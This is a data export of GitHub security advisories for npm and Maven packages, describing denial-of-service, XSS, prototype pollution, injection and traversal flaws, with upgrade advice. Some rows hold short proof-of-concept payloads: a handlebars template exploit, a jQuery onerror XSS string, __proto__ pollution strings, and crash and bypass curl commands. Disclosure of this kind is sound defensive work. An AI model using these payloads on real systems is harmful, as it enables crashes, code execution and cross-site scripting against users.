647,33991,com.fasterxml.jackson.datatype:jackson-datatype-jsr310,GHSA-h4x4-5qp2-wp46,CVE-2018-1000873,https://github.com/advisories/GHSA-h4x4-5qp2-wp46,moderate,2018-12-21 17:46:54 UTC,Moderate severity vulnerability that affects com.fasterxml.jackson.datatype:jackson-datatype-jsr353,"Fasterxml Jackson version Before 2.9.8 contains a CWE-20: Improper Input Validation vulnerability in Jackson-Databind that can result in Causes a denial-of-service (DoS). This attack appear to be exploitable via The victim deserializes malicious input, specifically very large values in the nanoseconds field of a time value. This vulnerability appears to have been fixed in 2.9.8.",maven
648,15978,node-fetch,GHSA-w7rc-rwvf-8q5r,CVE-2020-15168,https://github.com/advisories/GHSA-w7rc-rwvf-8q5r,low,2020-09-10 17:46:21 UTC,The `size` option isn't honored after following a redirect in node-fetch,"### Impact
Node Fetch did not honor the `size` option after following a redirect, which means that when a content size was over the limit, a `FetchError` would never get thrown and the process would end without failure.

For most people, this fix will have a little or no impact. However, if you are relying on node-fetch to gate files above a size, the impact could be significant, for example: If you don't double-check the size of the data after `fetch()` has completed, your JS thread could get tied up doing work on a large file (DoS) and/or cost you money in computing.

### Patches
We released patched versions for both stable and beta channels:

- For `v2`: 2.6.1
- For `v3`: 3.0.0-beta.9

### Workarounds
None, it is strongly recommended to update as soon as possible.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [node-fetch](https://github.com/node-fetch/node-fetch/issues/new?assignees=&labels=question&template=support-or-usage.md&title=Question%3A+)
* Contact one of the core maintainers.",npm
649,33948,org.hibernate:hibernate-validator,GHSA-xxgp-pcfc-3vgc,CVE-2017-7536,https://github.com/advisories/GHSA-xxgp-pcfc-3vgc,high,2020-06-15 19:57:48 UTC,Privilege Escalation in Hibernate Validator,"In Hibernate Validator 5.2.x before 5.2.5.Final, 5.3.x before 5.3.6.Final, and 5.4.x before 5.4.2.Final, it was found that when the security manager's reflective permissions, which allows it to access the private members of the class, are granted to Hibernate Validator, a potential privilege escalation can occur. By allowing the calling code to access those private members without the permission an attacker may be able to validate an invalid instance and access the private member value via ConstraintViolation#getInvalidValue().",maven
650,17221,bl,GHSA-pp7h-53gx-mx7r,CVE-2020-8244,https://github.com/advisories/GHSA-pp7h-53gx-mx7r,moderate,2020-09-02 15:26:19 UTC,Remote Memory Exposure in bl,"A buffer over-read vulnerability exists in bl <4.0.3, <3.0.1, <2.2.1, and <1.2.3 which could allow an attacker to supply user input (even typed) that if it ends up in consume() argument and can become negative, the BufferList state can be corrupted, tricking it into exposing uninitialized memory via regular .slice() calls.",npm
651,16863,next,GHSA-5vj8-3v2h-h38v,,https://github.com/advisories/GHSA-5vj8-3v2h-h38v,high,2020-09-04 18:04:08 UTC,Remote Code Execution in next,"Versions of `next` prior to 5.1.0 are vulnerable to Remote Code Execution. The `/path:` route fails to properly sanitize input and passes it to a `require()` call. This allows attackers to execute JavaScript code on the server. Note that prior version 0.9.9 package `next` npm package hosted a different utility (0.4.1 being the latest version of that codebase), and this advisory does not apply to those versions.

## Recommendation

Upgrade to version 5.1.0.",npm
652,17945,papaparse,GHSA-qvjc-g5vr-mfgr,,https://github.com/advisories/GHSA-qvjc-g5vr-mfgr,high,2020-09-04 18:03:04 UTC,Regular Expression Denial of Service in papaparse,"Versions of `papaparse` prior to 5.2.0 are vulnerable to Regular Expression Denial of Service (ReDos). The `parse` function contains a malformed regular expression that takes exponentially longer to process non-numerical inputs. This allows attackers to stall systems and lead to Denial of Service.


## Recommendation

Upgrade to version 5.2.0 or later.",npm
653,16430,http-proxy,GHSA-6x33-pw7p-hmpq,,https://github.com/advisories/GHSA-6x33-pw7p-hmpq,high,2020-09-04 17:59:49 UTC,Denial of Service in http-proxy,"Versions of `http-proxy` prior to 1.18.1 are vulnerable to Denial of Service. An HTTP request with a long body triggers an `ERR_HTTP_HEADERS_SENT` unhandled exception that crashes the proxy server. This is only possible when the proxy server sets headers in the proxy request using the `proxyReq.setHeader` function.   

For a proxy server running on `http://localhost:3000`, the following curl request triggers the unhandled exception:  
```curl -XPOST http://localhost:3000 -d ""$(python -c 'print(""x""*1025)')""```


## Recommendation

Upgrade to version 1.18.1 or later",npm
654,18181,@hapi/hapi,GHSA-23vw-mhv5-grv5,,https://github.com/advisories/GHSA-23vw-mhv5-grv5,high,2020-09-03 15:48:43 UTC,Denial of Service in @hapi/hapi,"Versions of `@hapi/hapi` prior to 18.4.1 or 19.1.1 are vulnerable to Denial of Service. The CORS request handler has a vulnerability which will cause the function to throw a system error if the header contains some invalid values. If no unhandled exception handler is available, the application will exist, allowing an attacker to shut down services.


## Recommendation

Upgrade to versions 18.4.1, 19.1.1 or later.",npm
655,16345,hapi,GHSA-7hx8-2rxv-66xv,,https://github.com/advisories/GHSA-7hx8-2rxv-66xv,high,2020-09-03 15:48:00 UTC,Denial of Service in hapi,"All Versions of `hapi` are vulnerable to Denial of Service. The CORS request handler has a vulnerability which will cause the function to throw a system error if the header contains some invalid values. If no unhandled exception handler is available, the application will exist, allowing an attacker to shut down services.


## Recommendation

This package is deprecated and is now maintained as `@hapi/hapi`. Please update your dependencies to use `@hapi/hapi`. ",npm
656,17621,tree-kill,GHSA-884p-74jh-xrg2,,https://github.com/advisories/GHSA-884p-74jh-xrg2,high,2020-09-04 16:57:20 UTC,Command Injection in tree-kill,"Versions of `tree-kill` prior to 1.2.2 are vulnerable to Command Injection. The package fails to sanitize values passed to the  `kill` function. If this value is user-controlled it  may allow attackers to run arbitrary commands in the server. The issue only affects Windows systems.


## Recommendation

Upgrade to version 1.2.2 or later.",npm
657,15801,react,GHSA-g53w-52xc-2j85,CVE-2013-7035,https://github.com/advisories/GHSA-g53w-52xc-2j85,moderate,2020-09-04 16:52:57 UTC,Cross-Site Scripting in react,"Affected versions of `react` are vulnerable to Cross-Site Scripting (XSS). The package fails to properly sanitize input used to create keys. This may allow attackers to execute arbitrary JavaScript if a key is generated from user input.


## Recommendation

If you are using `react` 0.5.x, upgrade to version 0.5.2 or later.
If you are using `react` 0.4.x, upgrade to version 0.4.2 or later.",npm
658,15801,react,GHSA-hg79-j56m-fxgv,,https://github.com/advisories/GHSA-hg79-j56m-fxgv,high,2020-09-04 15:26:04 UTC,Cross-Site Scripting in react,"Versions of `react` prior to 0.14.0 are vulnerable to Cross-Site Scripting (XSS). The package's `createElement` function fails to properly validate its input object, allowing attackers to execute arbitrary JavaScript in a victim's browser.


## Recommendation

Upgrade to version 0.14.0 or later.",npm
659,17001,markdown,GHSA-wx77-rp39-c6vg,,https://github.com/advisories/GHSA-wx77-rp39-c6vg,low,2020-09-04 15:11:03 UTC,Regular Expression Denial of Service in markdown,"All versions of `markdown` are vulnerable to Regular Expression Denial of Service (ReDoS). The `markdown.toHTML()` function has significantly degraded performance when parsing long strings containing underscores. This may lead to Denial of Service if the parser accepts user input.


## Recommendation

No fix is currently available. Consider using an alternative package until a fix is made available.",npm
660,16013,handlebars,GHSA-q2c6-c6pm-g3gh,,https://github.com/advisories/GHSA-q2c6-c6pm-g3gh,high,2020-09-04 15:07:38 UTC,Arbitrary Code Execution in handlebars,"Versions of `handlebars` prior to 3.0.8 or 4.5.3 are vulnerable to Arbitrary Code Execution. The package's lookup helper fails to properly validate templates, allowing attackers to submit templates that execute arbitrary JavaScript in the system. It is due to an incomplete fix for a [previous issue](https://www.npmjs.com/advisories/1316). This vulnerability can be used to run arbitrary code in a server processing Handlebars templates or on a victim's browser (effectively serving as Cross-Site Scripting).


## Recommendation

Upgrade to version 3.0.8, 4.5.3 or later.",npm
661,16013,handlebars,GHSA-g9r4-xpmj-mj65,,https://github.com/advisories/GHSA-g9r4-xpmj-mj65,high,2020-09-04 15:06:32 UTC,Prototype Pollution in handlebars,"Versions of `handlebars` prior to 3.0.8 or 4.5.3 are vulnerable to prototype pollution. It is possible to add or modify properties to the Object prototype through a malicious template. This may allow attackers to crash the application or execute Arbitrary Code in specific conditions.


## Recommendation

Upgrade to version 3.0.8, 4.5.3 or later.",npm
662,16013,handlebars,GHSA-2cf5-4w76-r9qv,,https://github.com/advisories/GHSA-2cf5-4w76-r9qv,high,2020-09-04 14:57:38 UTC,Arbitrary Code Execution in handlebars,"Versions of `handlebars` prior to 3.0.8 or 4.5.2 are vulnerable to Arbitrary Code Execution. The package's lookup helper fails to properly validate templates, allowing attackers to submit templates that execute arbitrary JavaScript in the system. It can be used to run arbitrary code in a server processing Handlebars templates or on a victim's browser (effectively serving as Cross-Site Scripting).

The following template can be used to demonstrate the vulnerability:  
```{{#with ""constructor""}}
	{{#with split as |a|}}
		{{pop (push ""alert('Vulnerable Handlebars JS');"")}}
		{{#with (concat (lookup join (slice 0 1)))}}
			{{#each (slice 2 3)}}
				{{#with (apply 0 a)}}
					{{.}}
				{{/with}}
			{{/each}}
		{{/with}}
	{{/with}}
{{/with}}```


## Recommendation

Upgrade to version 3.0.8, 4.5.2 or later.",npm
663,17078,showdown,GHSA-h6mq-3cj6-h738,,https://github.com/advisories/GHSA-h6mq-3cj6-h738,low,2020-09-03 23:21:16 UTC,Reverse Tabnabbing in showdown,"Versions of `showdown` prior to 1.9.1 are vulnerable to [Reverse Tabnabbing](https://www.owasp.org/index.php/Reverse_Tabnabbing). The package uses `target='_blank'` in anchor tags, allowing attackers to access `window.opener` for the original page when opening links. This is commonly used for phishing attacks.


## Recommendation

Upgrade to version 1.9.1 or later.",npm
664,16013,handlebars,GHSA-f52g-6jhx-586p,,https://github.com/advisories/GHSA-f52g-6jhx-586p,moderate,2020-09-03 23:20:12 UTC,Denial of Service in handlebars,"Affected versions of `handlebars` are vulnerable to Denial of Service. The package's parser may be forced into an endless loop while processing specially-crafted templates. This may allow attackers to exhaust system resources leading to Denial of Service.


## Recommendation

Upgrade to version 4.4.5 or later.",npm
665,17729,decompress,GHSA-qgfr-5hqp-vrw9,CVE-2020-12265,https://github.com/advisories/GHSA-qgfr-5hqp-vrw9,critical,2020-09-03 21:16:27 UTC,Path Traversal in decompress,"Versions of `decompress` prior to 4.2.1 are vulnerable to Arbitrary File Write. The package fails to prevent extraction of files with relative paths, allowing attackers to write to any folder in the system by including filenames containing`../`.


## Recommendation

Upgrade to version 4.2.1 or later.",npm
666,16074,mongodb,GHSA-mh5c-679w-hh4r,,https://github.com/advisories/GHSA-mh5c-679w-hh4r,high,2020-09-03 21:12:01 UTC,Denial of Service in mongodb,"Versions of `mongodb` prior to 3.1.13 are vulnerable to Denial of Service. The package fails to properly catch an exception when a collection name is invalid and the DB does not exist, crashing the application.


## Recommendation

Upgrade to version 3.1.13 or later.",npm
667,16330,sequelize,GHSA-fw4p-36j9-rrj3,,https://github.com/advisories/GHSA-fw4p-36j9-rrj3,moderate,2020-09-03 20:25:33 UTC,Denial of Service in sequelize,"Versions of `sequelize` prior to 4.44.4 are vulnerable to Denial of Service (DoS). The SQLite dialect fails to catch a `TypeError` exception for the `results` variable. The `results` value may be undefined and trigger the error on a `.map` call. This may allow attackers to submit malicious input that forces the exception and crashes the Node process.  

The following proof-of-concept crashes the Node process:  
```
const Sequelize = require('sequelize');

const sequelize = new Sequelize({
	dialect: 'sqlite',
	storage: 'database.sqlite'
});

const TypeError = sequelize.define('TypeError', {
	name: Sequelize.STRING,
});

TypeError.sync({force: true}).then(() => {
	return TypeError.create({name: ""SELECT tbl_name FROM sqlite_master""});
});
```


## Recommendation

Upgrade to version 4.44.4 or later.",npm
668,18371,mithril,GHSA-c3px-v9c7-m734,,https://github.com/advisories/GHSA-c3px-v9c7-m734,high,2020-09-03 19:04:39 UTC,Prototype Pollution in mithril,"Affected versions of `mithril`are vulnerable to prototype pollution. The function `parseQueryString` may allow a malicious user to modify the prototype of `Object`, causing the addition or modification of an existing property that will exist on all objects. A payload such as `__proto__%5BtoString%5D=123` in the query string would change the `toString()` function to `123`.



## Recommendation

If you are using mithril 2.x, upgrade to version 2.0.2 or later.
If you are using mithril 1.x, upgrade to version 1.1.7 or later.",npm
669,16065,marked,GHSA-ch52-vgq2-943f,,https://github.com/advisories/GHSA-ch52-vgq2-943f,low,2020-09-03 18:15:53 UTC,Regular Expression Denial of Service in marked,"Affected versions of `marked` are vulnerable to Regular Expression Denial of Service (ReDoS). The `_label` subrule may significantly degrade parsing performance of malformed input.


## Recommendation

Upgrade to version 0.7.0 or later.",npm
670,18656,lodash.mergewith,GHSA-779f-wgxg-qr8f,,https://github.com/advisories/GHSA-779f-wgxg-qr8f,high,2020-09-03 18:10:22 UTC,Prototype Pollution in lodash.mergewith,"Versions of `lodash.mergewith` before 4.6.2 are vulnerable to prototype pollution. The function `mergeWith` may allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.




## Recommendation

Update to version 4.6.2 or later.",npm
671,17734,lodash.defaultsdeep,GHSA-46fh-8fc5-xcwx,,https://github.com/advisories/GHSA-46fh-8fc5-xcwx,high,2020-09-03 18:09:16 UTC,Prototype Pollution in lodash.defaultsdeep,"Versions of `lodash.defaultsdeep` before 4.6.1 are vulnerable to Prototype Pollution. The function 'defaultsDeep' may allow a malicious user to modify the prototype of `Object` via `__proto__` causing the addition or modification of an existing property that will exist on all objects.




## Recommendation

Update to version 4.6.1 or later.",npm
672,18656,lodash.mergewith,GHSA-5947-m4fg-xhqg,,https://github.com/advisories/GHSA-5947-m4fg-xhqg,high,2020-09-03 18:08:10 UTC,Prototype Pollution in lodash.mergewith,"Versions of `lodash.mergewith` before 4.6.1 are vulnerable to Prototype Pollution. The function 'mergeWith' may allow a malicious user to modify the prototype of `Object` via `__proto__` causing the addition or modification of an existing property that will exist on all objects.




## Recommendation

Update to version 4.6.1 or later.",npm
673,17734,lodash.defaultsdeep,GHSA-h5mp-5q4p-ggf5,,https://github.com/advisories/GHSA-h5mp-5q4p-ggf5,high,2020-09-03 18:07:05 UTC,Prototype Pollution in lodash.defaultsdeep,"Versions of `lodash.defaultsdeep` before 4.6.1 are vulnerable to prototype pollution. The function `mergeWith` may allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.




## Recommendation

Update to version 4.6.1 or later.",npm
674,16314,lodash.merge,GHSA-2m96-9w4j-wgv7,,https://github.com/advisories/GHSA-2m96-9w4j-wgv7,high,2020-09-03 18:06:00 UTC,Prototype Pollution in lodash.merge,"Versions of `lodash.merge` before 4.6.1 are vulnerable to Prototype Pollution. The function 'merge' may allow a malicious user to modify the prototype of `Object` via `__proto__` causing the addition or modification of an existing property that will exist on all objects.




## Recommendation

Update to version 4.6.1 or later.",npm
675,16314,lodash.merge,GHSA-h726-x36v-rx45,,https://github.com/advisories/GHSA-h726-x36v-rx45,high,2020-09-03 18:04:54 UTC,Prototype Pollution in lodash.merge,"Versions of `lodash.merge` before 4.6.2 are vulnerable to prototype pollution. The function `merge` may allow a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.




## Recommendation

Update to version 4.6.2 or later.",npm
676,17002,quill,GHSA-588m-9qg5-35pq,,https://github.com/advisories/GHSA-588m-9qg5-35pq,moderate,2020-09-03 17:19:09 UTC,Reverse Tabnabbing in quill,"Versions of `quill` prior to 1.3.7 are vulnerable to [Reverse Tabnabbing](https://www.owasp.org/index.php/Reverse_Tabnabbing). The package uses `target='_blank'` in anchor tags, allowing attackers to access `window.opener` for the original page when opening links. This is commonly used for phishing attacks.


## Recommendation

No fix is currently available. Consider using an alternative package until a fix is made available.",npm
677,16484,serve,GHSA-cpgr-wmr9-qxv4,,https://github.com/advisories/GHSA-cpgr-wmr9-qxv4,moderate,2020-09-11 21:20:14 UTC,Cross-Site Scripting in serve,"Versions of `serve` prior to 10.0.2 are vulnerable to Cross-Site Scripting (XSS). The package fails to sanitize filenames, allowing attackers to execute arbitrary JavaScript in the victim's browser through files with names containing malicious code.


## Recommendation

Upgrade to version 10.0.2 or later.",npm
678,16484,serve,GHSA-xw79-hhv6-578c,,https://github.com/advisories/GHSA-xw79-hhv6-578c,high,2020-09-11 21:16:59 UTC,Cross-Site Scripting in serve,"Versions of `serve` prior to 10.0.2 are vulnerable to Cross-Site Scripting (XSS). The package does not encode output, allowing attackers to execute arbitrary JavaScript in the victim's browser if user-supplied input is rendered.


## Recommendation

Upgrade to version 10.0.2 or later.",npm
679,16484,serve,GHSA-48gc-5j93-5cfq,,https://github.com/advisories/GHSA-48gc-5j93-5cfq,high,2020-09-11 21:15:54 UTC,Path Traversal in serve,"Versions of `serve` prior to 10.1.2 are vulnerable to Path Traversal. Explicitly ignored folders can be accessed through relative paths, which allows attackers to access hidden folders and files.


## Recommendation

Upgrade to version 10.1.2 or later.",npm
680,15827,node-sass,GHSA-9v62-24cr-58cx,,https://github.com/advisories/GHSA-9v62-24cr-58cx,moderate,2020-09-11 21:12:39 UTC,Denial of Service in node-sass,"Affected versions of `node-sass` are vulnerable to Denial of Service (DoS). Crafted objects passed to the `renderSync` function may trigger C++ assertions in `CustomImporterBridge::get_importer_entry` and `CustomImporterBridge::post_process_return_value` that crash the Node process. This may allow attackers to crash the system's running Node process and lead to Denial of Service.


## Recommendation

Upgrade to version 4.13.1 or later",npm
681,17653,loopback,GHSA-724c-6vrf-99rq,,https://github.com/advisories/GHSA-724c-6vrf-99rq,low,2020-09-02 21:49:48 UTC,Sensitive Data Exposure in loopback,"Versions of `loopback` prior to 3.26.0 (3.x) and 2.42.0 (2.x) are vulnerable to Sensitive Data Exposure. Invalid API requests to the login endpoint may return information about the first user in the database. This can be used alongside other attacks for credential theft.


## Recommendation

If you're using `loopback` 3.x upgrade to version 3.26.0 or later.
If you're using `loopback` 2.x upgrade to version 2.42.0 or later.",npm
682,16597,preact,GHSA-cg48-9hh2-x6mx,,https://github.com/advisories/GHSA-cg48-9hh2-x6mx,moderate,2020-09-02 18:28:58 UTC,HTML Injection in preact,"Versions of `preact` 10.x on prerelease tags alpha and beta prior to 10.0.0-beta.1 are vulnerable to HTML Injection. Due to insufficient input validation the package allows attackers to inject JavaScript objects as virtual-dom nodes, which may lead to Cross-Site Scripting. This requires user input parsed with `JSON.parse()` to be passed directly into JSX without sanitization.


## Recommendation

Upgrade to version 10.0.0-beta.1.",npm
683,16134,puppeteer,GHSA-c2gp-86p4-5935,CVE-2019-5786,https://github.com/advisories/GHSA-c2gp-86p4-5935,moderate,2020-09-02 18:25:43 UTC,Use-After-Free in puppeteer,"Versions of `puppeteer` prior to 1.13.0 are vulnerable to the Use-After-Free vulnerability in Chromium (CVE-2019-5786). The Chromium FileReader API is vulnerable to Use-After-Free which may lead to Remote Code Execution.


## Recommendation

Upgrade to version 1.13.0 or later.",npm
684,18643,materialize-css,GHSA-98f7-p5rc-jx67,CVE-2019-11002,https://github.com/advisories/GHSA-98f7-p5rc-jx67,moderate,2019-04-09 19:44:40 UTC,Cross-Site Scripting in materialize-css,"All versions of `materialize-css` are vulnerable to Cross-Site Scripting. The `tooltip` component does not sufficiently sanitize user input, allowing an attacker to execute arbitrary JavaScript code if the malicious input is rendered by a user.


## Recommendation

No fix is currently available. Consider using an alternative module until a fix is made available.",npm
685,18643,materialize-css,GHSA-7752-f4gf-94gc,CVE-2019-11003,https://github.com/advisories/GHSA-7752-f4gf-94gc,moderate,2019-04-09 19:44:38 UTC,Cross-Site Scripting in materialize-css,"All versions of `materialize-css` are vulnerable to Cross-Site Scripting. The `autocomplete` component does not sufficiently sanitize user input, allowing an attacker to execute arbitrary JavaScript code if the malicious input is rendered by a user.


## Recommendation

No fix is currently available. Consider using an alternative module until a fix is made available.",npm
686,16842,googleapis,GHSA-7543-mr7h-6v86,,https://github.com/advisories/GHSA-7543-mr7h-6v86,high,2020-09-02 16:00:26 UTC,Improper Authorization in googleapis,"Versions of `googleapis` prior to 39.1.0 are vulnerable to Improper Authorization. Setting credentials to one client may apply to all clients which may cause requests to be sent with the incorrect credentials.


## Recommendation

Upgrade to version 39.1.0.",npm
687,16486,clean-css,GHSA-wxhq-pm8v-cw75,,https://github.com/advisories/GHSA-wxhq-pm8v-cw75,low,2019-06-05 20:50:16 UTC,Regular Expression Denial of Service in clean-css,"Version of `clean-css` prior to 4.1.11 are vulnerable to Regular Expression Denial of Service (ReDoS). Untrusted input may cause catastrophic backtracking while matching regular expressions. This can cause the application to be unresponsive leading to Denial of Service.


## Recommendation

Upgrade to version 4.1.11 or higher.",npm
688,17653,loopback,GHSA-8wgc-jjvv-cv6v,,https://github.com/advisories/GHSA-8wgc-jjvv-cv6v,high,2020-09-02 15:54:52 UTC,Improper Authorization in loopback,"Vulnerable versions of `loopback` may allow attackers to create Authentication Tokens on behalf of other users due to Improper Authorization. If the AccessToken model is publicly exposed, an attacker can create Authorization Tokens for any user as long as they know the target's `userId`. This will allow the attacker to access the user's data and their privileges.


## Recommendation

For loopback 2.x, upgrade to version 2.40.0 or later
For loopback 3.x, upgrade to version 3.22.0 or later",npm
689,17817,bootstrap-vue,GHSA-c7pp-x73h-4m2v,,https://github.com/advisories/GHSA-c7pp-x73h-4m2v,high,2020-09-02 15:53:46 UTC,Cross-Site Scripting in bootstrap-vue,"Versions of `bootstrap-vue` prior to 2.0.0-rc.12 are vulnerable to Cross-Site Scripting. Due to insufficient input sanitization, components may be vulnerable to Cross-Site Scripting through the `options` variable. This may lead to the execution of malicious JavaScript on the user's browser.


## Recommendation

Upgrade to version 2.0.0-rc.12 or later.",npm
690,18716,eslint-config-eslint,GHSA-pv55-r6j3-wp94,,https://github.com/advisories/GHSA-pv55-r6j3-wp94,critical,2020-09-01 20:45:57 UTC,Malicious Package in eslint-config-eslint,"Version 5.0.2 of `eslint-config-eslint` was published without authorization and was found to contain malicious code. This code would read the users `.npmrc` file and send any found authentication tokens to a remote server.


## Recommendation

The best course of action if you found this package installed in your environment is to revoke all your npm tokens. You can find instructions on how to do that here. https://docs.npmjs.com/getting-started/working_with_tokens#how-to-revoke-tokens
",npm
691,18265,base64url,GHSA-rvg8-pwq2-xj7q,,https://github.com/advisories/GHSA-rvg8-pwq2-xj7q,moderate,2020-09-01 20:42:44 UTC,Out-of-bounds Read in base64url,"Versions of `base64url` before 3.0.0 are vulnerable to to out-of-bounds reads as it allocates uninitialized Buffers when number is passed in input on Node.js 4.x and below.


## Recommendation

Update to version 3.0.0 or later.",npm
692,16038,mongoose,GHSA-r5xw-q988-826m,,https://github.com/advisories/GHSA-r5xw-q988-826m,moderate,2020-09-01 19:39:37 UTC,Remote Memory Exposure in mongoose,"Versions of `mongoose` before 4.3.6, 3.8.39 are vulnerable to remote memory exposure.

Trying to save a number to a field of type Buffer on the affected mongoose versions allocates a chunk of uninitialized memory and stores it in the database.


## Recommendation

Update to version 4.3.6, 3.8.39 or later.",npm
693,16484,serve,GHSA-wm7q-rxch-43mx,,https://github.com/advisories/GHSA-wm7q-rxch-43mx,high,2020-09-01 19:38:33 UTC,Byass due to validation before canonicalization in serve,"Versions of `serve` before 6.5.2 are vulnerable to the bypass of the ignore functionality. The bypass is possible because validation happens before canonicalization of paths and filenames.



Example:
Here we have a server that ignores the file test.txt.
```
const serve = require('serve')
const server = serve(__dirname, {
      port: 1337,
      ignore: ['test.txt']
})
```

Using the URL encoded form of a letter (%65 instead of e) attacker can bypass the ignore control accessing the file. 

`curl http://localhost:1337/t%65st.txt`

Additionally this technique can be used to get directory listings of ignored directories.


## Recommendation

Update to version 6.5.2 or later.",npm
694,17225,slug,GHSA-jxqq-cqm6-pfq9,CVE-2017-16117,https://github.com/advisories/GHSA-jxqq-cqm6-pfq9,moderate,2018-07-24 20:06:45 UTC,Regular Expression Denial of Service in slug,"Affected versions of `slug` are vulnerable to a regular expression denial of service when parsing untrusted user input.

The issue is low severity, as it takes 50,000 characters to cause the event loop to block for 2 seconds,

About 50k characters can block the event loop for 2 seconds.


## Recommendation

Update to version 0.9.2 or later.",npm
695,16825,string,GHSA-g36h-6r4f-3mqp,CVE-2017-16116,https://github.com/advisories/GHSA-g36h-6r4f-3mqp,high,2018-07-24 20:16:11 UTC,Regular Expression Denial of Service in string,"Affected versions of `string` are vulnerable to regular expression denial of service when specifically crafted untrusted user input is passed into the `underscore` or `unescapeHTML` methods.


## Recommendation

There is currently no direct patch for this vulnerability. 

Currently, the best solution is to avoid passing user input to the `underscore` and `unescapeHTML` methods.

Alternatively, a user provided patch is available in [Pull Request #217]( https://github.com/jprichardson/string.js/pull/217/commits/eab9511e4efbc8c521e18b6cf2e8565ae50c5a16), however this patch has not been tested, nor has it been merged by the package author.",npm
696,34642,org.webjars.npm:jquery,GHSA-2pqj-h3vj-pqgw,CVE-2012-6708,https://github.com/advisories/GHSA-2pqj-h3vj-pqgw,high,2020-09-01 16:41:46 UTC,Cross-Site Scripting in jquery,"Affected versions of `jquery` are vulnerable to cross-site scripting. This occurs because the main `jquery` function uses a regular expression to differentiate between HTML and selectors, but does not properly anchor the regular expression. The result is that `jquery` may interpret HTML as selectors when given certain inputs, allowing for client side code execution.

## Proof of Concept
```
$(""#log"").html(
    $(""element[attribute='<img src=\""x\"" onerror=\""alert(1)\"" />']"").html()
);
```




## Recommendation

Update to version 1.9.0 or later.",maven
697,17936,sync-exec,GHSA-38h8-x697-gh8q,CVE-2017-16024,https://github.com/advisories/GHSA-38h8-x697-gh8q,moderate,2018-11-09 17:45:30 UTC,Tmp files readable by other users in sync-exec,"Affected versions of `sync-exec` use files located in `/tmp/` to buffer command results before returning values. As `/tmp/` is almost always set with world readable permissions, this may allow low privilege users on the system to read the results of commands run via `sync-exec` under a higher privilege user.


## Recommendation

There is currently no direct patch for `sync-exec`, as the `child_process.execSync` function provided in Node.js v0.12.0 and later provides the same functionality natively. 

The best mitigation currently is to update to Node.js v0.12.0 or later, and migrate all uses of `sync-exec` to `child_process.execSync()`.",npm
698,16105,npm,GHSA-v3jv-wrf4-5845,CVE-2013-4116,https://github.com/advisories/GHSA-v3jv-wrf4-5845,low,2020-09-01 16:03:34 UTC,Local Privilege Escalation in npm,"Affected versions of `npm` use predictable temporary file names during archive unpacking. If an attacker can create a symbolic link at the location of one of these temporary file names, the attacker can arbitrarily write to any file that the user which owns the `npm` process has permission to write to, potentially resulting in local privilege escalation.



## Recommendation

Update to version 1.3.3 or later.",npm
699,18262,uws,GHSA-hf5h-hh56-3vrg,CVE-2016-10544,https://github.com/advisories/GHSA-hf5h-hh56-3vrg,high,2020-09-01 16:02:29 UTC,Denial of Service in uws,"Affected versions of `uws` do not properly handle large websocket messages when `permessage-deflate` is enabled, which may result in a denial of service condition.

If `uws` recieves a 256Mb websocket message when `permessage-deflate` is enabled, the server will compress the message prior to executing the length check, and subsequently extract the message prior to processing. This can result in a situation where an excessively large websocket message passes the length checks, yet still gets cast from a Buffer to a string, which will exceed v8's maximum string size and crash the process.


## Recommendation

Update to version 0.10.9 or later.

Alternatively, disable `permessage-deflate`.",npm
700,16714,mqtt,GHSA-hg78-c92r-hvwr,CVE-2016-1000242,https://github.com/advisories/GHSA-hg78-c92r-hvwr,high,2020-09-01 16:01:24 UTC,Denial of Service in mqtt,"Affected versions of `mqtt` will cause the node process to crash when receiving specially crafted MQTT packets, making the application vulnerable to a denial of service condition.



## Recommendation

Update to v1.0.0 or later",npm
701,16330,sequelize,GHSA-5v9h-q3gj-c32x,CVE-2016-1000225,https://github.com/advisories/GHSA-5v9h-q3gj-c32x,critical,2020-09-01 15:27:40 UTC,SQL Injection via GeoJSON in sequelize,"Affected versions of `sequelize` are vulnerable to SQL Injection in Models that have fields with the `GEOMETRY` DataType. This vulnerability occurs because single quotes in document values are not escaped for GeoJSON documents using `ST_GeomFromGeoJSON`, and MySQL GeoJSON documents using `GeomFromText`.


## Recommendation

Update to version 3.23.6 or later.",npm
702,16144,mysql,GHSA-fvq6-55gv-jx9f,CVE-2015-9244,https://github.com/advisories/GHSA-fvq6-55gv-jx9f,moderate,2020-09-01 15:21:05 UTC,SQL Injection in mysql,"Versions of `mysql` prior to 2.0.0-alpha8 are affected by a SQL Injection vulnerability in the `mysql.escape()` function, which does not properly escape object keys.


## Recommendation

Update to version 2.0.0-alpha8 or later.",npm
703,16345,hapi,GHSA-j3g2-m5jj-6336,CVE-2015-9243,https://github.com/advisories/GHSA-j3g2-m5jj-6336,moderate,2020-09-01 15:20:00 UTC,Unsafe Merging of CORS Configuration Conflict in hapi,"Versions of `hapi` prior to 11.1.4 are affected by a vulnerability that causes route-level CORS configuration to override connection-level or server-level CORS defaults. This may result in a situation where CORS permissions are less restrictive than intended.




## Recommendation

Update hapi to version 11.1.4 or later.",npm
704,16804,gm,GHSA-pjh3-jv7w-9jpr,CVE-2015-7982,https://github.com/advisories/GHSA-pjh3-jv7w-9jpr,critical,2020-09-01 15:18:55 UTC,Command Injection in gm,"Versions of `gm` prior to 1.21.1 are affected by a command injection vulnerability. The vulnerability is triggered when user input is passed into `gm.compare()`, which fails to sanitize input correctly before calling the graphics magic binary.


## Recommendation

Update to version 1.21.1 or later.",npm
705,16255,validator,GHSA-f5w6-r7rg-mcgq,CVE-2014-8882,https://github.com/advisories/GHSA-f5w6-r7rg-mcgq,high,2020-08-31 23:01:13 UTC,Regular Expression Denial of Service in validator,"Versions of `validator` prior to 3.22.1 are affected by a regular expression denial of service vulnerability in the `isURL` method.


## Recommendation

Update to version 3.22.1 or later.",npm
706,18455,st,GHSA-69rr-wvh9-6c4q,CVE-2014-3744,https://github.com/advisories/GHSA-69rr-wvh9-6c4q,high,2020-08-31 22:58:04 UTC,Directory Traversal in st,"Versions of `st` prior to 0.2.5 are affected by a directory traversal vulnerability. Vulnerable versions fail to properly handle URL encoded dots, which caused `%2e` to be interpreted as `.` by the filesystem, resulting the potential for an attacker to read sensitive files on the server.


## Recommendation

Update to version 0.2.5 or later.",npm
